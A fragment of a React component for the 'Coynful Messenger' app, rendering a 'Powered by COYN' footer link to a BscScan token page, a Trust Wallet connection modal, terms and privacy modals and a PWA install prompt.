        <div className="text-center mt-8 pt-6 border-t border-gray-200 dark:border-slate-700">
          <div className="flex items-center justify-center space-x-2 opacity-75">
            <span className="text-sm text-gray-600 dark:text-slate-400">Powered by</span>
            <a 
              href="https://bscscan.com/token/0x22c89a156cb6f05bc54fae2ed8d690a1bc4fe8e1"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center space-x-1 hover:opacity-100 transition-all duration-300 hover:scale-105 cursor-pointer group"
            >
              <LazyImage 
                src={coynLogoPath} 
                alt="COYN" 
                className="h-6 w-6 object-contain group-hover:drop-shadow-[0_0_10px_rgba(251,146,60,0.7)] transition-all duration-300"
              />
              <span className="text-sm font-medium text-gray-700 dark:text-slate-300 group-hover:text-orange-500 dark:group-hover:text-orange-400 transition-colors">COYN</span>
            </a>
          </div>
        </div>
      </div>

      {/* Wallet Redirect Modal */}
      {isRedirectingToWallet && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-lg p-6 max-w-sm mx-auto shadow-xl border border-gray-200 dark:border-slate-700">
            <div className="text-center space-y-4">
              <div className="w-16 h-16 mx-auto bg-blue-100 dark:bg-blue-900/30 rounded-full flex items-center justify-center">
                <div className="w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
              </div>
              <div>
                <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-2">
                  Connecting to Trust Wallet
                </h3>
                <p className="text-gray-600 dark:text-gray-400 text-sm">
                  {walletRedirectMessage}
                </p>
                <p className="text-xs text-gray-500 dark:text-gray-500 mt-2">
                  Complete the connection in Trust Wallet and you'll be automatically returned to Coynful Messenger
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Terms and Privacy Modals */}
      <TermsModal 
        isOpen={showTermsModal} 
        onClose={() => setShowTermsModal(false)} 
      />
      <PrivacyModal 
        isOpen={showPrivacyModal} 
        onClose={() => setShowPrivacyModal(false)} 
      />
      
      {/* PWA Install Prompt */}
      <PWAInstallPrompt />
      
    </div>
  );
}